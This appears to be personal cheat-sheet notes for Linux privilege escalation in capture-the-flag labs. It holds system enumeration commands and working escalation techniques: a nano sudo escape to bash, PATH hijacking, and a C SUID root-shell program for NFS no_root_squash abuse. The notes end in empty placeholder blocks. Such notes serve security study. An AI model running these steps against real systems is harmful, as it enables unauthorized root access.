### Run the following commands to enumerate a system

**Returns the hostname of the target machine**
```JavaScript
hostname
```
**Will print system information giving us additional detail about the kernel used by the system**
```JavaScript
uname -a
```

**The proc filesystem (procfs) provides information about the target system processes**
```JavaScript
/proc/version
```

**Usually contains some information about the operating system**
```JavaScript
/etc/issue
```

**View all running processes**
```JavaScript
ps -A
```
**View process tree**
```JavaScript
ps axjf
```

**View processes for all users**
```JavaScript
ps aux
```

**List all commands your user can run using sudo**
```JavaScript
sudo -l
```
**General overview of the user’s privilege level and group memberships**
```JavaScript
id 
```

**Verify environment variables*
```JavaScript
env
```

**Potentially discover users on the system**
```JavaScript
/etc/passwd
```

**Cut away the fat from the command above**
```JavaScript
cat /etc/passwd | grep home
```

**View network routes**
```JavaScript
ip route
```

**Show all listening ports and established connections**
```JavaScript
netstat -a
```

**Show all listening TCP and UDP ports and established connections**
```JavaScript
netstat -at 
```

**list TCP or UDP protocols **
```JavaScript
netstat -au
```

**List ports in listening mode**
```JavaScript
netstat -l
```
**List network usage statistics by protocol **
```JavaScript
netstat -s
```

**List connections with the service name and PID information**
```JavaScript
netstat -tp
```
**Show interface statistics**
```JavaScript
netstat -i
```

**Netstat. Display all sockets, Do no resolve names, Display timers**
```JavaScript
netstat -ano
```

**find the file named “flag1.txt” in the current directory**
```JavaScript
find . -name flag1.txt
```

**find the file names “flag1.txt” in the /home directory**
```JavaScript
find /home -name flag1.txt
```

**find the directory named config under “/”**
```JavaScript
find / -type d -name config
```

**find files with the 777 permissions (files readable, writable, and executable by all users)**
```JavaScript
find / -type f -perm 0777
```

**find executable files**
```JavaScript
find / -perm a=x
```

**find all files for user “frank” under “/home”**
```JavaScript
find /home -user frank
```

**find files that were modified in the last 10 days**
```JavaScript
find / -mtime 10
```

**find files that were accessed in the last 10 day**
```JavaScript
find / -atime 10
```

**find files changed within the last hour (60 minutes)**
```JavaScript
find / -cmin -60
```

**find files accesses within the last hour (60 minutes)**
```JavaScript
find / -amin -60
```

**find files with a 50 MB size**
```JavaScript
find / -size 50M
```

**Folders and files that can be written to or executed from**
```JavaScript
find / -writable -type d 2>/dev/null
```
```JavaScript
find / -perm -222 -type d 2>/dev/null
```
```JavaScript
find / -perm -o w -type d 2>/dev/null
```

**Does the same as above, but also cleans up the output with cut and sort**
```JavaScript
find / -writable -type d 2>/dev/null | cut -d "/" -f 2 | sort -u
```


**Find world-executable folders**
```JavaScript
find / -perm -o x -type d 2>/dev/null
```

**Find development tools and supported languages**
```JavaScript
find / -name perl*
```
```JavaScript
find / -name python*
```
```JavaScript
find / -name gcc*
```

**Find files with the SUID bit**
```JavaScript
find / -perm -u=s -type f 2>/dev/null
```

**Find files with the SUID or SGID bit set**
```JavaScript
find / -type f -perm -04000 -ls 2>/dev/null
```

**Privilege Escalation with Sudo**

Run nano and press CTRL+R and CTRL+X. Then enter the following and press enter:
```JavaScript
reset; bash 1>&0 2>&0
```

### Capabilities**

Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

- When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.
- Note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
- [GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
](https://gtfobins.github.io/gtfobins/vim/#capabilities)

**Use the getcap tool to list enabled capabilities**
```JavaScript
getcap -r / 2>/dev/null
```

**Priv Esc with PATH**

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).

Before exploiting with, ensure you can answer the following questions:

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

*Ensure that whatever scripts you find are calling a binary with no defined path. This will force the script to look within the PATH variable. If the directory that contains your exploit is not in PATH, add it to it like so:*
```JavaScript
export PATH=/tmp:$PATH
```

Find writable files and clean the output of the command
```JavaScript
find / -writable 2>/dev/null | grep home | cut -d "/" -f 2 | sort -u
```

**Network File Sharing**

- NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

- The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

- Start by enumerating mountable shares from your attacker machine


```JavaScript
showmount -e <VictimIP>
```
- You will then mount of the "no_root_squash" shares to the attacker machine and begin building the executable
```JavaScript
mkdir /tmp/backupsonattackermachine
```
```JavaScript
mount -o rw <VictimIP>:/backups /tmp/backupsonattackermachine
```

Then set the SUID bits
```JavaScript
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```

****


```JavaScript

```
